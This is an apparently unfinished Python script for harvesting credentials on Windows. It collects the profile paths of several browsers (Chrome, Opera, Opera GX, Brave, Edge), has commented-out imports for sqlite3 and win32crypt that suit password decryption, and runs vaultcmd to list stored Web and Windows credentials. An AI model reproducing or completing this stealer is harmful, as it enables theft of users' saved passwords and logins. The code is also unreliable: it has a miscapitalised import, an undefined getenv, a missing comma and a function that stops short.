import requests
import os
import subprocess
import pyautogui
import cV2
# import socket
# import sqlite3
# import win32crypt
# import math
# import datetime
# import json
# import platform
# import psutil
# import GPUtil
# import re
# import pandas
# import shutil

# import zipfile

def GetPath():
    print("Getting Current working directory...")
    print(os.getcwd())
    print()

def GetCreds():
    local = getenv('LOCALAPPDATA')
    roaming = getenv('APPDATA')

    paths = {

    'Google Chrome': local + '\\Google\\User Data\\Default',
    'Opera': roaming +  '\\Opera Software\\Opera Stable',
    'Opera GX': roaming + '\\Opera GX Software\\Opera GX Stable',
    'Brave': local + '\\Brave Software\\Brave-Browser\\User Data\\Default'
    'Edge': local + '\\Microsoft\\Edge\\User Data\\Default'
    
    }


command1 = "vaultcmd /listcreds:'Web Credentials' /all";
command2 = "vaultcmd /listcreds:'Windows Credentials' /all";


subprocess.Popen(command1, shell=True)
subprocess.Popen(command2, shell=True)
